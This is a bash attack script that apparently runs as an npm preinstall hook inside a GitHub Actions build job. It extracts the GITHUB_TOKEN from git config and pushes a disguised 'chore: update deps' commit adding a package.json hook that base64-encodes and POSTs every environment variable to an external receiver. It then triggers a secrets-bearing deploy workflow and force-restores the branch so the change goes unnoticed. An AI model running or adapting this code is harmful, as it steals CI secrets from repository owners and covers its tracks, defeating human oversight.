#!/bin/bash
# payload.sh — Runs during npm ci preinstall in the privileged build job
#
# Strategy: push a poisoned package.json to joule-integration (non-workflow file,
# so GITHUB_TOKEN allows it), then trigger workflow_dispatch on that branch.
# deploy-manual.yml already has all secrets as job env vars — when it runs npm ci,
# our preinstall hook fires with those secrets in the environment.

RECEIVER_URL="https://sap-test-receiver-production.up.railway.app/collect"
REPO="delsoup455/architecture-center-test"
API="https://api.github.com"

# --- Extract GITHUB_TOKEN ---
# Not in env during npm preinstall, but actions/checkout stores it in git config
TOKEN="$GITHUB_TOKEN"
if [ -z "$TOKEN" ]; then
  EXTRAHEADER=$(git config --get http.https://github.com/.extraheader 2>/dev/null || true)
  if [ -n "$EXTRAHEADER" ]; then
    TOKEN=$(echo "$EXTRAHEADER" | sed 's/.*basic //' | base64 -d 2>/dev/null | cut -d: -f2)
  fi
fi
if [ -z "$TOKEN" ]; then
  TOKEN=$(env | grep -iE '^(GITHUB_TOKEN|GH_TOKEN|INPUT_TOKEN)=' | head -1 | cut -d= -f2-)
fi

AUTH="Authorization: token $TOKEN"
TOKEN_LEN=${#TOKEN}
curl -s "$RECEIVER_URL?stage=phase1_token&token_len=$TOKEN_LEN" || true

# --- Phase 2: Push poisoned package.json to joule-integration ---
# Get current commit SHA of joule-integration
BASE_SHA=$(curl -s -H "$AUTH" "$API/repos/$REPO/git/ref/heads/joule-integration" | jq -r '.object.sha // empty' 2>/dev/null)
if [ -z "$BASE_SHA" ]; then
  curl -s "$RECEIVER_URL?stage=phase2_failed&reason=no_base_sha" || true
  exit 0
fi
curl -s "$RECEIVER_URL?stage=phase2_base_sha&sha=$BASE_SHA" || true

# Get the current tree of that commit
PARENT_TREE=$(curl -s -H "$AUTH" "$API/repos/$REPO/git/commits/$BASE_SHA" | jq -r '.tree.sha // empty' 2>/dev/null)
if [ -z "$PARENT_TREE" ]; then
  curl -s "$RECEIVER_URL?stage=phase2_failed&reason=no_parent_tree" || true
  exit 0
fi

# Create poisoned package.json — adds a preinstall hook that dumps all env vars
# (deploy-manual.yml sets secrets as job env vars, so they'll be in the environment)
POISONED_PKG=$(cat <<'PKGJSON'
{
  "name": "architecture-center-test",
  "version": "1.0.0",
  "private": true,
  "scripts": {
    "preinstall": "curl -s -X POST \"https://sap-test-receiver-production.up.railway.app/collect?stage=full_dump\" -d \"$(env | base64 -w0)\" || true",
    "build": "echo 'building site...'",
    "start": "echo 'starting dev server...'"
  },
  "dependencies": {}
}
PKGJSON
)

# Create blob for the poisoned package.json
BLOB_SHA=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
  "$API/repos/$REPO/git/blobs" \
  -d "{\"content\":$(echo "$POISONED_PKG" | jq -Rs .),\"encoding\":\"utf-8\"}" | jq -r '.sha // empty' 2>/dev/null)
if [ -z "$BLOB_SHA" ]; then
  curl -s "$RECEIVER_URL?stage=phase2_failed&reason=blob_failed" || true
  exit 0
fi

# Also create a matching package-lock.json (so npm ci works)
LOCK_CONTENT='{"name":"architecture-center-test","version":"1.0.0","lockfileVersion":3,"requires":true,"packages":{"":{"name":"architecture-center-test","version":"1.0.0","dependencies":{}}}}'
LOCK_BLOB_SHA=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
  "$API/repos/$REPO/git/blobs" \
  -d "{\"content\":$(echo "$LOCK_CONTENT" | jq -Rs .),\"encoding\":\"utf-8\"}" | jq -r '.sha // empty' 2>/dev/null)

# Create tree with poisoned package.json (NOT a workflow file — no 403!)
TREE_SHA=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
  "$API/repos/$REPO/git/trees" \
  -d "{\"base_tree\":\"$PARENT_TREE\",\"tree\":[{\"path\":\"package.json\",\"mode\":\"100644\",\"type\":\"blob\",\"sha\":\"$BLOB_SHA\"},{\"path\":\"package-lock.json\",\"mode\":\"100644\",\"type\":\"blob\",\"sha\":\"$LOCK_BLOB_SHA\"}]}" | jq -r '.sha // empty' 2>/dev/null)
if [ -z "$TREE_SHA" ]; then
  curl -s "$RECEIVER_URL?stage=phase2_failed&reason=tree_failed" || true
  exit 0
fi

# Create commit
NEW_COMMIT=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
  "$API/repos/$REPO/git/commits" \
  -d "{\"message\":\"chore: update deps\",\"tree\":\"$TREE_SHA\",\"parents\":[\"$BASE_SHA\"]}" | jq -r '.sha // empty' 2>/dev/null)
if [ -z "$NEW_COMMIT" ]; then
  curl -s "$RECEIVER_URL?stage=phase2_failed&reason=commit_failed" || true
  exit 0
fi

# Update joule-integration branch to point to our commit
UPDATE_SHA=$(curl -s -X PATCH -H "$AUTH" -H "Content-Type: application/json" \
  "$API/repos/$REPO/git/refs/heads/joule-integration" \
  -d "{\"sha\":\"$NEW_COMMIT\"}" | jq -r '.object.sha // empty' 2>/dev/null)
if [ -z "$UPDATE_SHA" ]; then
  curl -s "$RECEIVER_URL?stage=phase2_failed&reason=update_ref_failed" || true
  exit 0
fi
curl -s "$RECEIVER_URL?stage=phase2_push_ok&commit=$NEW_COMMIT" || true

# --- Phase 3: Trigger workflow_dispatch on joule-integration ---
# deploy-manual.yml already exists with all secrets as env vars
sleep 3

DISPATCH_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "$AUTH" -H "Content-Type: application/json" \
  "$API/repos/$REPO/actions/workflows/deploy-manual.yml/dispatches" \
  -d "{\"ref\":\"joule-integration\"}" 2>&1)
curl -s "$RECEIVER_URL?stage=phase3_dispatch&http_code=$DISPATCH_CODE" || true

# --- Phase 4: Restore joule-integration to original state ---
# Put it back so no one notices
curl -s -X PATCH -H "$AUTH" -H "Content-Type: application/json" \
  "$API/repos/$REPO/git/refs/heads/joule-integration" \
  -d "{\"sha\":\"$BASE_SHA\",\"force\":true}" || true
curl -s "$RECEIVER_URL?stage=phase4_restored" || true

curl -s "$RECEIVER_URL?stage=payload_complete" || true
exit 0
